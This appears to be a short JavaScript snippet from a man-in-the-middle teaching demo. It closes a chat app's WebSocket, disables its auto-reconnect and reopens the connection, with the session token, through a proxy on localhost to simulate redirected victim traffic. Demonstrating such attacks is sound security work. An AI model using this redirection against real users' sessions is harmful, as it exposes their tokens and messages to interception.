
// redirects the tabs WebSocket through the MitM proxy (port 8766)
// instead of the real server (port 8765) 
// simulating a victim whose traffic has already been redirected to an attacker's machine.

(function redirectViaProxy() {
  const oldHandler = socket.onmessage;
  socket.onclose = null;   // stop chat.js's auto-reconnect from undoing this
  socket.close();
  socket = new WebSocket(`ws://localhost:8766/ws?token=${token}`);
  socket.onmessage = oldHandler;
  console.warn("Redirected through the MitM proxy (localhost:8766). Check the proxy's terminal.");
})();